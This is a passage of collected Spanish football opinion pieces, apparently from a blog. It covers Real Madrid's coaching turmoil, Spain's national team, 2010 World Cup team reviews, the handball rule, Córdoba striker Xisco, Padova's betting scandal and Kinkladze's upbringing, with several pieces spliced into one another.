convertido más allá de en una costumbre en una exigencia insana, es donde afloran todos los males, algunos reales, otros ficticios y artificiales. Porque ni que el Real Madrid solo haya sido capaz de sumar tres puntos de nueve posibles en este arranque liguero ni las aparentes dificultades para conseguir que el equipo arranque en su juego pueden ser motivo suficiente para emborronar el folio, romperlo con rabia y tirarlo a la papelera. ¿Crisis? ¿Qué crisis? , decían Supertramp. Hay algo en este club que obliga al reseteo de memoria casi continuo. Lo que se consiguió hace cuatro meses parece quedar sin validez ante la urgencia de nuevas demostraciones de fuerza, de seguir sumando, de empezar de cero para volver a demostrar no sé exactamente el qué. Solo así se explican ciertos movimientos en lo referente a la dirección deportiva. Prescindir de lo que funcionaba, borrón y cuenta nueva, y obligar al técnico a repetir una tarea que ya parecia haber resuelto. Y encima, Di María, sentando cátedra en Old Trafford. Una manera de dirigir la nave que choca radicalmente con las urgencias y las exigencias inherentes a la grandeza del propio club, en el que se pide todo para ayer. El tiempo y la paciencia son bienes escasos en Chamartín. Total, este equipo llegó hasta aquí habiendo ganado la Copa del Rey, la Liga de Campeones y la Supercopa de Europa. Migajas que ya nadie parece recordar. Cristiano Ronaldo. Cinco goles en un partido son motivo más que suficiente para volver a recordar que cuando el portugués acciona la manivela de devastar rivales no hay nadie con una voracidad comparable. Sus cinco ante el Espanyol, además, le convierten en el mayor goleador de la historia del Real Madrid en el Campeonato de Liga, superando a Raúl. Sigue glosando su leyenda.Jaume Domènech. Debutaba en Primera división defendiendo la siempre delicada y compleja portería del Valencia en El Molinón y su actuación fue decisiva para permitir a los suyos arrancar los tres puntos de Gijón. Sostuvo al equipo cuando el Sporting decidió venirse arriba y actuó con una solvencia propia del más experimentado de los veteranos.Quedan muchas cosas que mejorar en este equipo. En el campo y fuera de él. Yo sólo defiendo a un portero porque intuyo que Casillas calla más de lo que habla y que ha tomado una decisión que aplaudo: jugar al fútbol y dejar el circo futbolístico para los demás. Sólo por eso, y por lo que ha sido y es como guardameta, le deseo suerte en un equipo que, de momento, sobrevive como puede a la dura resaca que le dejó el mercado de verano. El fútbol es un desafío a la inteligencia. Pasa que veintidós personas pelean por un balón y nosotros nos aferramos a la televisión como si el mundo a nuestro alrededor se parara. Pasa que lloramos cuando perdemos y, a veces, hasta cuando ganamos. Que recordamos alineaciones completas desde niños o coleccionamos camisetas de equipos a los que jamás veremos jugar.También pasa, y aquí hay menos literatura, que el fútbol es un lugar inhóspito del que apenas sabemos nada. Que vemos los edificios pero no las cloacas. Que tiene flores deslumbrantes pero, bajo la tierra, húmedas y retorcidas raíces. En los vestuarios, sobre el césped del entreno, y en las charlas técnicas a puerta cerrada impera un lenguaje desconocido. Claves apenas descifradas de lealtad, soberbia o simple idiotez. Los jugadores generan tanto dinero, tantas bondades, que parecen héroes pero, vistos de cerca, se asemejan más a una pandilla de niños cagones y llorones pataleando en la puerta de una guardería.La ´cama´se lleva haciendo desde que el fútbol es fútbol. La negamos, como negamos el garrafón o los mensajes a exnovias borrachos, por una cuestión de higiene. Nos da miedo pensar que una plantilla de indocumentados perdedores esté encajando goles exclusivamente por desavenencias con su entrenador. Que dejen de correr o retiren la pierna por celo profesional. Que no den el cien por cien condicionados por sus antipatías, por sus manías, por sus minúsculos enfados. No sabemos realmente qué ocurre de puertas para dentro. Ni sus conversaciones, ni sus desplantes. Ni el pellizco del entrenador en el moflete de su pupilo, ni el manotazo posterior del futbolista enfadado.Pasa con ´la cama´ lo mismo que pasa con ´los huevos´: que cuando no sabemos lo que ocurre sobre el campo, esgrimimos conceptos vacuos. Los huevos son el intangible del fútbol. Si corren porque corren y si esperan porque esperan. El éxito se calibra en huevos. Los huevos marcan el tempo del aficionado. Cuanto más brega, hostias y carreras imposibles tras un balón que se va por la línea de fondo; más huevos tiene nuestro equipo. Supongo que los huevos para el entrenador son un tema accesorio.Para un entrenador, pongamos por ejemplo a Benítez, lo importante es la diligencia en lo táctico, la solidaridad defensiva, la concentración en los balones parados y la certidumbre para chutar a gol. Ahí entra en juego el concepto de la cama. La cama es no querer que te entrene el que te entrena. Como si una mañana mi compañero Paco y yo, que compartimos oficina y obligaciones, nos alineáramos en contra de nuestro jefe y dejáramos de trabajar o hiciéramos los proyectos mal a propósito.Siempre he negado la cama. Siempre, por salud, he pensado que los futbolistas juegan en cada partido al máximo de sus fuerzas. Que la vida son dos días y su contratos finitos. Jugadores que no especularían con su futuro, que no ensuciarían su juego con marrullerías de despacho, con berrinches infantiles. Será que sólo veo la luz del fútbol y no sus agitados intestinos. Lo cierto es que llegó Zidane y los del Madrid corrían como conejos; y en tres días, esa pandilla triste que pululaba por el césped mutó en un espectáculo ofensivo solo al alcance del Nakatsu FC.La cama del Madrid tiene sábanas nuevas. Todo huele a limpio.Una manera de jugar de la cual no puede discutirse que, guste más o menos, ha garantizado competitividad y copas donde hay que mostrarlo, en los grandes torneos. Y ojo, que España ha ganado todos los partidos de la fase de clasificación, algo que no se consigue ni con la plasta controlada de Londres ni con el horror anárquico sobre el patatal centroamericano. El modelo es la base, la arcilla, y el fuego del horno lo brinda la motivación, algo que sin duda ha escaseado en los últimos diez días. Si ya las fases previas no son en absoluto indicador de lo que ocurre cuando realmente llega lo importante –pregunten a Clemente y a sus récords- imagínense un par de amistosos a destiempo. Mandarlo todo por la borda entra en el terreno del nonsense.Aparte de estas críticas coyunturales, aunque en parte causante de ellas, hay otro peso injusto que carga la selección sobre sus espaldas, y que condiciona muchísimo la mirada a partir de la cual se la juzga. En medio de la borrachera de títulos, hubimos de soportar una avalancha de hipérboles y ditirambos calificándola de nada menos que “el equipo de todos los tiempos”, “la gran referencia universal”, “el más justo campeón jamás visto” y barbaridades por el estilo. En la distancia, parece que el recuerdo se ha embellecido hasta el punto de distorsionar la realidad y dejar en la memoria una imagen de la Roja como apisonadora continua que, simplemente, es falsa. Los dos torneos conquistados –bastante gloria es ésta ya- en sus fases decisivas, dejaron un tiempo maravilloso contra Rusia, dos buenos partidos contra Alemania, lucha igualada frente a Holanda e Italia, un rosario de victorias apretadas y algunos golpazos de suerte de ésa que antes siempre nos faltaba. Sin embargo, la catarata de exageraciones y la negación de la realidad mantiene a mucha gente en una suerte de limbo feliz, pidiendo incluso para Polonia-Ucrania un hipotético grupo formado por Alemania, Francia y Portugal. Como si ganar la Eurocopa fuera pan comido. Más gallitos que nadie.Los extremos son muy malos en el fútbol, y ni el endiosamiento ni la crucifixión suelen conducir a nada positivo, especialmente si vienen dictados por el corto plazo. Si la España actual será una selección que marque época no sólo por títulos sino también por fútbol, lo sabremos dentro de veinte años, no ahora. Si el equipo nacional sigue en el culmen de su competitividad o, por el contrario, ha comenzado la decadencia y cada vez es más presa fácil del rival, empezaremos a saberlo en junio, en las lejanas tierras orientales. Hasta entonces, seamos conscientes de que tenemos una gran selección que genera enorme respeto, que a lo mejor no arrasan tanto como unos dicen pero serán, donde importa, mucho más duros de roer de lo que piensan otros, y sobre todo, que estos tipos y este entrenador merecen un voto de confianza. Aunque sólo sea porque nos dieron dos noches que ninguno olvidaremos jamás. Lo demás, el tiempo lo dirá. Quizá el mejor jugador de su tiempo, Ferenc Puskas llegó a la famosa final del Wankdorf con sensaciones encontradas: por un lado su selección era indiscutiblemente el mejor equipo de la época –y de muchas épocas- y él su motor; por otro, “Cañoncito” arrastró todo el campeonato una lesión que no le dejó rendir a su auténtico nivel. Esta dicotomía funciona como perfecta alegoría de un partido que Hungría iba ganando a los ocho minutos 2-0 con gol de nuestro protagonista, pero en el que anduvo lastrada por las limitaciones de su gran estrella, que se pasó cojeando gran parte del partido. Aún así, Puskas se las arregló para lograr un empate postrero que desafiaba al milagro de Fritz Walter, pero el fuera de juego que señaló Ling dejó sin premio a un equipo maravilloso y a un futbolista irrepetible. Brasil. Cuartos de final. Tres partidos ganados, uno empatado y otro perdido, con nueve goles marcados y cuatro encajados. Goleadores: Luis Fabiano (3), Elano (2), Robinho (2), Maicon y Juan.Lo mejor: la imagen de equipo poderoso e inasequible que dio la verdeamarelha durante todo el torneo, excepto el segundo tiempo contra Holanda.Lo peor: las dos melonadas de cuartos de final, el subsiguiente desplome anímico del equipo, y la sensación, con nombres en la palestra tipo Felipao, de que puede continuar el viaje de la canarinha hacia la mediocridad.La estrella: Maicon. El lateral derecho se comportó durante todo el torneo como un émbolo implacable por su banda, anotó uno de los goles del torneo y fue quizá el único que siguió intentándolo cuando todo se derrumbaba a su alrededor.El momento: la falta de entendimiento entre Julio César y Felipe Melo que provocó el empate de Holanda. Fue un shock.Portugal. Caída en octavos de final. Un triunfo, dos empates y una derrota, siete goles a favor y uno en contra. Goleadores: Tiago (2), Meireles, Simao, Hugo Almeida, Liedson y Cristiano Ronaldo.Lo mejor: el poderío defensivo exhibido durante todo el torneo, muy especialmente por la pareja de centrales Alves-Carvalho, y la solvencia del portero Eduardo.Lo peor: la táctica cavernícola de Queiroz, más cercana al catenaccio que al juego clásico de Portugal; la sufrió más que nadie Cristiano Ronaldo, que pareció muy poco implicado en cualquier caso.La estrella: Fabio Coentrao. El lateral del Benfica confirmó en el mejor escaparate que es uno de los laterales zurdos más apetecibles del mercado, sacrificado, técnico y potente.El momento: el gol de Villa, que castigó la racanería lusa en un partido que los vecinos podrían haber intentado afrontar de igual a igual. Ahí se acabó la aventura portuguesa en Sudáfrica.Costa de Marfil. Eliminada en la primera fase. Un partido ganado, otro empatado y otro perdido, cuatro goles a favor y tres en contra. Goleadores: Drogba, Yaya Touré, Romaric y Kalou.Lo mejor: el buen tono mostrado en el partido ante Portugal, en el que merecieron la victoria, y la entereza de Drogba aguantando con su brazo dañado.Lo peor: ese juego plano que es la marca de fábrica de los equipos de Eriksson, el discreto rendimiento de gente como Kalou o los Touré, y la poca convicción en la goleada mostrada en el último encuentro.La estrella: Gervinho. Durante muchos momentos, la mejor baza de los marfileños fue el desparpajo delante del jugador del Fenerbahce , que en ningún momento gozó de la confianza de su entrenador.El momento: cuando el sevillista Romaric anotó el segundo gol ante Corea del Norte antes del ecuador del segundo tiempo. Ahí el milagro pareció posible.Corea del Norte: eliminada en la primera fase, con tres derrotas, un gol anotado y doce recibidos. Goleador: Ji Yun-Nam. Lo mejor: la actitud deshinibida con la que salieron frente Brasil, y la resistencia que mostraron en ese partido frente a toda una pentacampeona del mundo.Lo peor: de largo el peor equipo del campeonato, la ley marcial impuesta sobre la selección no impidió comprobar el ínfimo nivel técnico de la mayoría de sus futbolistas, ni los repetidos fallos defensivos más propios de un equipo amateur. Si el dictador Kim Yong-Il es el entrenador en la sombra, como se ha rumoreado, tiene poco futuro en los banquillos.La estrella: Jong Tae-Se, cuyas maniobras y medidos pases nos mostraron al único futbolista realmente dotado de su selección. Estaría bien verlo fuera de Corea del Norte.El momento: sin lugar a dudas, las lágrimas emocionadas de Tae-Se al sonar el himno de su país en el primer partido. Toda una muestra del poder sentimental del fútbol, y uno de las imágenes icono del Mundial. Hoy traemos a esta sección al máximo goleador de la historia de los mundiales. Los quince goles de Ronaldo dejan un perfecto catálogo del que fue quizá el mejor delantero de nuestra época, además de un testimonio perfecto de la evolución de su juego y de su físico –condicionados ambos por gravísimas lesiones- a través de los ocho años en los que, sucesivamente, bombardeó redes en Francia, Corea-Japón y Alemania. Su cuenta goleadora podría ser incluso mayor si Parreira le hubiera dado algún minuto en el 94, cuando acudió a Estados Unidos como convidado de piedra, y hace todavía un año cobijaba alguna esperanza de acudir a Sudáfrica. No ha sido así, pero su récord sigue resultando un reto mayúsculo, y en la actualidad sólo Miroslav Klose parece en condiciones de acercarse a él. La historieta de hoy va un poco a modo de advertencia contra el triunfalismo vacío, y trata de una de las goleadas más tristes vistas en los mundiales. Corría el año 98, y una gran versión de la selección española –comparable en calidad a la actual- demolía a Bulgaria por un 6-1 crudo e inapelable. Sin embargo, la cara de Kiko al final, al borde de las lágrimas tras lograr su segundo tanto, lo decía todo: la exhibición no valía para nada, pues España, que había empezado perdiendo frente a Nigeria, se condenó al ser incapaz de meter un gol en el segundo partido a un equipo tosco y nada técnico, pero tan disciplinado y aguerrido que se mostró como una roca impenetrable en defensa. La selección paraguaya. Como todo lo que ocurre en los derbis se magnifica mucho más de lo normal, la jugada polémica del fin de semana ha sido la mano de Xabi Alonso. La jugada es bien conocida, y si queda alguien que no la haya visto puede consultar el minuto 2:05 de este vídeo: Xabi disputa un balón dividido con el brazo izquierdo separado del cuerpo, Kun Agüero dispara y el balón rebota, de forma violenta y clara, contra el brazo del centrocampista vasco.Se han abierto las ventanas de un vestuario que olía a camiseta sudada y a grifos oxidados. Florentino le ha dado la razón al niño en la discusión con su padre y, como premio, le ha comprado un videojuego nuevo. Después dicen que si el niño está mimado, pero una madre es una madre y cuando tengas hijos lo entenderás.Me gustaría saber qué pasó en el vestuario del Madrid tras el despido de Benítez. Me hubiera gustado leer los whatsapps que intercambiaron los jugadores, los guiños en el desayuno, los chistes por lo bajo. Nada es casual en el fútbol, siempre hay una causa y un efecto. Un plantel apático no puede convertirse en un catálogo de sonrisas así como así.Leo que estaban cansados de Benítez, que no se había podido hacer con las riendas del vestuario, que echaban de menos a Isco, que el míster exigía a Cristiano defender. Llegó Zidane y dio con la tecla con tanta sencillez como si hiciera la primera jugada del Simon. El Madrid juega a otra cosa y, en el fondo de mi inocencia, algo me dice que no es cosa de entrenadores sino de hacendosos jugadores mullendo una almohada y alisando las arrugas de una sábana recién puesta. Con esto de culturizar el fútbol a veces paso más tiempo hablando de donde tomo las cervezas ante de los partidos que de lo que sucede en el campo. Iba a empezar por la cultura, es decir, por todo aquello que rodea la peregrinación urbana hasta el estadio. Los bares, el ambiente, las bufandas a borbotones desde el Campo de La Verdad, el estadio interminable, los viejos amigos. Pero después vino lo de Xisco, el recuerdo de un jugador que me pareció un niño buscando consuelo, y pensé que nadie mejor que él para protagonizar el cuento vivido ayer en el Arcángel.El Córdoba ganó dos a cero al Girona. Fue un partido de Segunda, es decir, indefinido y azaroso. Igualado por tramos. Impredecible y con la sombra del error pendiendo sobre las cabezas de los jugadores como esa figura geométrica que corona a Los Sims. A su vez fue un partido bonito, se ve que la grada está con ganas. La ilusión siempre se tiene, pero a veces se muestra con más o menos entusiasmo. Yo conocía ya la ilusión silenciosa, tan cordobesista, esa esperanza que no se confiesa para no gafarla. Las ganas contenidas. Las pipas y las increpaciones al árbitro.Pero ayer hubo ovaciones tras los errores, y una camaradería que ningún idiota estropeó insultando a alguno de los nuestros. Y eso que el partido del lateral Janse dio para decirle un par de cosas.El equipo hizo su juego, no destacó en nada, contemporizó que se dice, esperó y especuló un poco. Parecía fútbol inane hasta que, rondando el minuto 40 de la primera parte, pensé en el tiempo que llevaba el Girona sin acercarse al área de Saizar. Faltaba el gol para que el plan de Pablo Villa tuviera sentido. Y no llegaba. Todos mirábamos a Xisco, claro. Pensé en Atlas. En el peso que tiene que cargar un delantero sobre sus hombros cuando el resto de compañeros carburan y el marcador sigue a cero. La buscó pero no salía. No es un jugador vistoso, no es López Silva, no es Pacheco. Es otra cosa. Una cosa exasperante a veces. Pero Xisco no viene de Tercera. Yo lo recuerdo en el Newcastle y un Depor de primera también. No es un tipo que “bueno, vale”, algo hay. Pero a veces parece que ni siquiera él lo sabe.Xisco, nuestro protagonista de hoy, es ese tipo de jugador que parece estar todo el día discutiendo consigo mismo. Los fracasos son como plomo en los bolsillos. No cuajó en Inglaterra pero algo queda, como después explicaré. El balear, como un Jeckyll y Hyde con balones en vez de tubos de ensayo, vive una lucha dentro. Se ve desde fuera. Se ve en sus compañeros, en sus gestos, y también lo ve la afición. La grada es como un psicólogo de guardia, que sabe dar donde más duele y animar cuando más lo necesitan. Por eso cuando falló un gol clamoroso en la primera parte, tras unos gritos casi instintivos, se deshizo en aplausos hacia el chaval. Como un padre que regaña blandamente una travesura. Eso me pareció Xisco, un niño buscando cariño, buscando apoyo para soportar la pesada carga. Y lo tuvo.Ramalho no pudo sino derribar a López Silva tras su internada en el área. La jugada cambió el partido. Primero expulsión del lateral y después el gol. Los jugadores del Córdoba se acercaron a Xisco. También López Silva balón en mano (gracias a @Jaracordoba y @JoseVegaStark por la corroboración). Le dio el balón y le diría algo así como “tíralo tú” mientras el resto de compañeros le animaban. Hay mucho en ese gesto paternal. El gol como un ibuprofeno tras una mala noche. Aquí tienes tu gol, Xisco, cuando lo marques te sentirás mejor. Y así fue.El colegiado Mateu Lahoz no señaló nada.Esta jugada nos sirve como pretexto  para tratar de ilustrar dos errores que tanto periodistas como aficionados cometen con una frecuencia exagerada. El primero es considerar que la mano es falta (o penalty, si se produce dentro del área), en virtud de lo clara que sea la infracción. Se oyen comentarios del tipo “el balón da claramente en el brazo” o “el brazo estaba claramente separado del cuerpo”, como razones taxativas y determinantes de una infracción que debería haberse señalado. El segundo tipo de argumento se expresa con frases como “es penalty porque corta juego”, o “hay que pitarla porque si no hubiera sido mano hubiera sido gol.” La realidad es que, de acuerdo con el reglamento, la primera de estas razones muestra una condición necesaria, pero no suficiente, para que la mano constituya infracción. La segunda es directamente irrelevante: una mano será falta o dejará de serlo exactamente igual si el balón va a puerta o a saque de banda, hacia atrás o hacia adelante. El destino de la pelota no tiene ninguna importancia –en cuanto a que la acción sea infracción o no- como no lo tiene que si no hubiera habido mano habría sido gol, pase decisivo, o nada en absoluto. Sencillamente, estas circunstancias no influyen en que la acción sea punible o no.Una vez que se ha comprobado de manera fehaciente que el balón ha dado en alguna parte de la mano o el brazo de algún futbolista, el hecho de que la acción sea falta o no depende exclusivamente de una cosa: la voluntariedad de la acción. El reglamento, en su regla XII, lo deja bien claro: “Se concederá un tiro libre directo al equipo adversario si un jugador comete una de las siguientes tres infracciones: […] tocar el balón deliberadamente con las manos.” Por tanto, lo único que tiene que decidir el árbitro, una vez está seguro de que ha habido mano, es si cree que ha sido voluntaria. Muchos factores pueden intervenir en la decisión de señalar falta o no: si el jugador está de cara o girado, si el movimiento se realiza instintivamente para protegerse, si va la mano al balón o el balón a la mano… lógicamente, el colegiado jamás conocerá los procesos mentales del jugador, pero debe interpretar todos los indicios a su alcance para decidir lo único importante: si el futbolista ha tocado voluntariamente el balón con la mano. Pese a que diga Quique Sánchez Flores que él no cree en las manos involuntarias, esto es, reglas en mano, lo único importante en este contexto. El resto de las consideraciones, por muy populares que resulten y mucho que induzcan al error al aficionado, son extemporáneas y fútiles, y carecen de importancia.Por cierto, en mi opinión la jugada de Alonso, que es una mano diáfana, no constituye infracción. Creo que el brazo izquierdo del madridista, que además se halla en el lado opuesto al balón, está estirado de forma natural para acompañar al movimiento que pretende realizar, que es golpear el balón fuertemente con la pierna derecha. Agüero, más rápido, se adelanta, y una décima de segundo después el balón está golpeando un brazo que no ha cambiado de posición. Por tanto, no parece haber voluntariedad en la acción, y no debe pitarse penalty. No importa lo flagrante en este caso, como ha quedado dicho, sino únicamente lo deliberado. El Real Madrid ha derrotado por 4-1 al CSKA de Moscú en el Santiago Bernabéu, y estará el viernes en el bombo de cuartos de final de la Champions League. Salió un partido bastante discreto, de aire administrativo, como si los 25 tipos que había en el césped supieran de antemano cuál iba a ser el desenlace. El equipo blanco salió muy frío y soportó una buena ocasión de Doumbia a pase de Dzagoev, quizá el único detalle relevante que dejó el fino centrocampista en toda la noche. Una buena combinación iniciada por Khedira y culminada por Higuaín a puerta vacía desequilibró el choque, y un trallazo de Cristiano al comienzo del segundo tiempo -en el que colaboró el guardamente Chepchugov– acabó de inclinarlo. Siguieron diez minutos en los que los rusos rompieron su doble línea de defensa y se fueron arriba, y poco más adelante cayó el tercero, en un buen golpeo del recién ingresado Benzema. El resto del partido quedó a beneficio de inventario, sirviendo para poco tanto el golazo de Tosic desde fuera del área como la bonita asistencia final de Benzema que posibilitó otro doblete de Cristiano. El Madrid espera rival, y se marcha del partido con dos malas noticias: la sanción de Xabi Alonso, ausencia segura en el próximo choque, y un descenso evidente en su nivel de juego en las últimas semanas respecto del que mostró en otoño. Y ojo, que lo importante llega ahora. Llegamos ya al final de la fase de grupos de la Europa League: un partido más, el cling-cling de las monedas cayendo en los bolsillos de equipos y UEFA, y a por la Copa de Europa, por fin. Pero bueno, no está de más repasar quienes protagonizarán en unos meses la madre de las competiciones de clubes. Lo haremos en dos entregas, una para cada día. Súmense a las apuestas, y no se alteren si empezamos por el grupo E.Grupo E. Desde el punto de vista de los equipos españoles, sin duda aquí tenemos el choque de la jornada. El Valencia se ha ganado depender de sí mismo en la última jornada, pero ha pagado su falta de contundencia fuera teniendo que jugársela en el Bridge. Si el choque es crucial para los chés, para Villas-Boas es mucho más, dado que su reconversión del Chelsea está resultando más trabajosa de lo previsto; una derrota mañana podría abrirle la puerta de salida. Clasificado ya el sorprendente Bayer Leverkusen, a los alemanes le vale la victoria frente al Genk para entrar como primeros, y cualquier resultado si hay empate en el otro partido. En caso, contrario, serían segundos, y el campeón el vencedor de Londres. El Valencia lo tiene más fácil: si gana o empata con goles se clasifica, en caso contrario adiós.Es lo que puede aportar al equipo de de Del Bosque.Dejando a un lado la alegría que me provoca ver a Michu en la lista, tanta lucha desde Tercera a la Premier lo viene mereciendo desde hace tiempo, me cuesta creer que el seleccionador tenga previstos muchos minutos para él. No es solo un tema de galones, que también, es que sus características casan con las de la Selección como las del agua con las del aceite. Una es combinación machacona entre líneas y el otro es apoyo rápido y siempre vertical.Michu es un devorador de espacios que no se detiene demasiado a combinar en esos espacios. Si hace un desmarque será el que le coloque en el lugar exacto para rematar. Ni uno más. No es un delantero acostumbrado a moverse por todo el frente de ataque, como Negredo, ni un atacante tan imaginativo como Cesc. Al menos no lo está siendo en el Swansea ni lo fue en el Rayo Vallecano. Tiene, eso sí, un don natural y magnífico para embocar en las situaciones más apuradas. Y eso será oro si Del Bosque (no parece) sabe sacarle partido a su nueva pieza. Padua es la ciudad del sin. La de santo sin nombre porque al patrón San Antonio, monje portugués de canonización fulminante y dicen que lengua incorrupta, se le conoce simplemente como El Santo; la del prado sin hierba porque el prado más grande de la localidad, el Prato della Valle, más que en verde abunda en baldosines y fontanas siendo como es una de las plazas más grandes de Italia y la del café sin puertas porque los dueños del Caffè Pedrocchi, allí se tomaban el espresso Stendhal o Dario Fo, solían tener la sana costumbre, sobre todo para sus parroquianos, de abrir día y noche. Y como todo es sin en Padua la costumbre podría alcanzar pronto al equipo de fútbol. El Padova, que pelea hoy por un puesto en una Serie A a la que no han vuelto desde hace 17 años, es uno de los implicados en el último escándalo de apuestas que salpica el fútbol italiano.Dal Canto, el jovencísimo entrenador que recondujo la ruina para llegar contra todo pronóstico hasta la pelea por el ascenso, y el presidente Cestaro practican su mejor cara para repetir como si de un mantra se tratase que no hay motivo alguno para la intranquilidad. Para la sospecha. Que Antonio no es el único santo en Pádua.La celebración, gritándonos a los que estábamos en el Gol Norte con el corazón latiendo como el de un hámster, fue como un purgante. Después abrazó a todos. Y volvió al campo.El partido estaba ganado, pero por si había dudas Xisco metió otro. Le dije a Adolfo “ha sido un gol británico”. Dos toques, uno para controlar y otro para meter la bola en la red. Eso lo aprendió en Newcastle, dije, aunque los metiera igual de juvenil. Pero lo vi claro. El portero y la defensa ni la vieron. Xisco estaba de vuelta. En su particular lucha ganó el goleador frente al inapetente, la referencia frente al ostracismo. La grada lo celebró como si Xisco fuera un poco el hijo de todos nosotros. Delante de mí estaban los padres de Dani Espejo. Por eso pienso en esto. Por eso pienso que a veces los jugadores buscan a los padres en la grada buscando la aprobación cálida, la sonrisa cómplice. A lo mejor por eso todos reaccionamos así de cándidos con nuestro delantero. Os haré una confesión: cuando no sé sobre qué escribir, escribo sobre porteros. Me es muy fácil simpatizar con esa posición ajena al orden del fútbol, con esos encargados de privar de goles a un público que quiere goles. Con esos sujetos que juegan diferente, que visten diferente, que sienten diferente. Con esos funámbulos que pasean temerosos entre la gloria y el fracaso, entre Green y Casillas, entre Arconada y Pfaff, entre Angoy y Wilfred. Afortunadamente nuestra liga lleva años siendo referente en cuanto a buenos guardametas se refiere. La Selección es sólo un ejemplo, hace no tanto sufríamos al ver que Zubizarreta envejecía mal y que lo que venía detrás no era desde luego garantía de nada. Molina contra Noruega, por poner un ejemplo. Ahora hay tres, pero podrían ser seis. Guaita, sin ir más lejos, sería internacional en cualquier otro país, tal vez en poco tiempo Javi Varas, y por supuesto Diego López.Es curioso como no se habla de “escuela española de porteros” o algún invento parecido. Siempre se habló de esa referencia norteña con respecto al arquero, ese perfil de guardameta corpulento, sereno, preciso en el momento adecuado, sin estridencias, que hacía de la regularidad su mayor arma. Un modelo que en los ochenta y principios de los noventa fue demandado y respetado hasta que Jorge Campos lo cambió todo. Prohibir coger el balón tras las cesiones, hace no tanto, obligó al portero a tener mayor protagonismo en el juego.Pero lo cierto es que el Atalanta-Padova del pasado 26 de marzo es uno de los 18 partidos de Serie B y Liga Pro que están desprendiendo un tufillo sospechoso a su paso frente a las narices de la Fiscalía de Cremona. El Atalanta era líder entonces, el Padova deambulaba por la mitad de la tabla y el mercado asiático de las apuestas registró 23 millones de euros por un empate más que anómalo en Bérgamo. ¿Quieren saber qué ocurrió? Que empataron.Hoy frente al Novara habrá 23.000 personas en el Euganeo y a la vuelta casi tantos frente a la pantalla gigante que se instalará en el viejo estadio Appiani. Estarán incluso el padre Formenton, cura histórico de la entidad biancoscudatta que ya se ha apresurado a dar su bendición al equipo y el padre Voltan, párroco en la Basílica del Santo que prefiere guardarse las bendiciones para asuntos más serios pero guarda un poster del Padova tras la puerta de la sacristía. Seguro que en la distancia tifaran Nicola Amoruso, Goran Vlaovic o incluso un Del Piero que no habrá olvidado sus cabalgadas de juventud. Y estará El Shaarawy, el prodigio egipcio cedido por el Genoa que ya deslumbra en las inferiores de la azzurra. Detrás estará en definitiva, la ciudad del sin entera rezando para que que lo que insinúa la prensa no sea cierto, para que por culpa de la corrupción el Padova no se convierta en el ascendido sin ascenso. Se juntaron el hambre y las ganas de comer. Resulta que el diario Marca (en plena búsqueda del resquicio que escupa un poco de luz al futuro de los que le dan sustento) recuerda hoy que el Barcelona ya fue víctima de una remontada europea tan insospechada como estrepitosa y como en esta casa, y en este editor en particular, la manía por recordar las cosas está más que arraigada no me ha quedado otra que recordar el suceso. Ajustar el retrovisor para echarle un vistazo breve a aquella estupenda anomalía.Eran los dieciseisavos de la Recopa y era un 4 de octubre de 1984 cuando el Metz compareció en el Camp Nou para poner la palabra desastre en todos los papeles. 1-4, el peor descalabro en la historia europea del club fue el calificativo de la prensa catalana para el suceso. Y más que nada porque los de Venables, con Bernd Schuster el mando, habían matado la eliminatoria en Saint-Symphorien imponiéndose al ignoto cuadro granate con un sonoro 2-4. Al aparato estuvo Tony Kurbos, tan yugoslavo e hirsuto como depredador. Ahora el Tigre Tony se dedica a vender coches pero un día fue el tipo más famoso de Francia. Uno de los lugares más jugosos del folclore futbolero es el entorno del futbolista. Ahí, en ese anillo de saturno precioso y a menudo desconocido, brillan fuerte las novias y los padres de. Son satélites necesarios. Como esos secundarios que nos arrancan el aplauso cada vez que abren la puerta en las telecomedias americanas de los ochenta. Estos titanes de la asesoría son also starring y merecen rótulos dorados con su nombre a la altura del pecho. Hablamos de alemanas recias que te pelean hasta la última cláusula del contrato, de espartanas en las redes sociales, de artistas de la ingeniería financiera, de papis que creen pasar de cateto a marqués cuando el Ferrari acelera de cero a cien. Hablamos del padre de Martin Ødegaard.Cuando leí que Hans Erik Odegaard montó un campo de fútbol de césped artificial en casa para que chavalín pudiera practicar sus magias 24/7, recordé la historia de Kinkladze, el georgiano del Manchester City. Antes de ser mito noventero en Inglaterra fue talento precoz en el Dinamo de Tbilisi, vivero prestigioso donde los haya del fútbol soviético. Su padre lo sabía. Tan consciente era de ello que hizo lo imposible por evolucionar su creación. “Vivíamos en un séptimo piso, pero nunca le dejaba subir en ascensor. Tenía que llevar la pelota con los pies, nunca le dejaba cogerla con las manos”, explicaba su hermana en ‘The perfect 10’, el librito que escribió David Clayton sobre el jugador celeste.Robinzon preparaba para el nene un litro de zumo de fruta y verdura fresca cada día. Un detallazo teniendo en cuenta que no eran  ingredientes que abundaran en las casas humildes de la recien independizada Tiflis. Pero hay más. Este buen hombre obligaba a Kinkladze a pasear sobre sus rodillas por el pequeño apartamento para fortalecer su tren inferior. ¿Un campo en casa para el chico? Robinzon (no me canso de escribirlo) habilitó un mini gimnasio con anillas paralelas para que la sangre de su sangre cincelara su musculatura a diario.Pero no es lo más extraño del relato extraño. La palabra aquí es ‘mtiuluri’, un baile tradicional georgiano. “La idea de apuntarlo a baile era para que mejorara sus movimientos de pies y la coordinación. Fue a clase hasta que tuvo 13 años. Tenía mucho talento y bailaba solos. Querían que se quedara y fuera bailarín pero decidió convertirse en futbolista.” Mtiuluri, pasen y vean. Y ahora, entrecomilladas ya unas cuantas locuras ante las que palidece el muy afanoso padre de Ødegaard y deberían servir de freno para padres inflamados, recordemos. Finales de los noventa, Manchester con el City en el barro. Apareció un georgiano desconocido que regateaba al regate, uno que floreció en Maine Road como crece un poco de hierba fresca en mitad del asfalto. Quien sabe si fortalecido por aquellas clases de baile o huyendo precisamente de ellas, entregaba su genio Giorgi Kinkladze.Foto: Manchester City Puede ocurrir que uno sea solo un ocasional del fútbol, de estos que pierden una tarde de su vida comiendo pipas y aplaudiendo naderías en el gallinero del Bernabéu, y decida aprovechar la visita a Londres con su parienta y los churumbeles para darse una vueltecita por las entrañas del Emirates Stadium. A estas citas acuden verdaderos aficionados, no lo niego, pero también abundan los mendrugos. Entonces, aventuro, que como buen turista español quizá se le ocurra despotricar porque el guía que le está descubriendo a usted un pedazo de historia del fútbol inglés sea un señor viejo, calvo y con pinta de conductor de autocares de línea en lugar de Thierry Henry. Ahí, pura elucubración insisto, algún local le mirará con desdén y ni se molestará en explicarle que el anciano es un cromo mítico. Que usted está blasfemando en nombre del único jugador en la historia del Arsenal en marcar en una final de copa europea y doméstica. Que ese calvito es Eddie Kelly.Rara hazaña la del escocés, centrocampista de 